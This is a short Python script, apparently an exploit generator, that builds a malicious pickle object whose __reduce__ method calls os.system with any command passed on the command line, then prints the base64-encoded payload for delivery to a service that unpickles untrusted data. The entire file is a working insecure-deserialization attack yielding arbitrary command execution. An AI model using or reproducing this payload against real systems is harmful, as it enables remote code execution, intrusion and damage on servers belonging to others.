import pickle, os, base64
class P(object):
    def __reduce__(self):
        import sys
        arg = sys.argv[1]
        return (os.system, (arg,))

print(base64.b64encode(pickle.dumps(P())).decode('utf-8'))
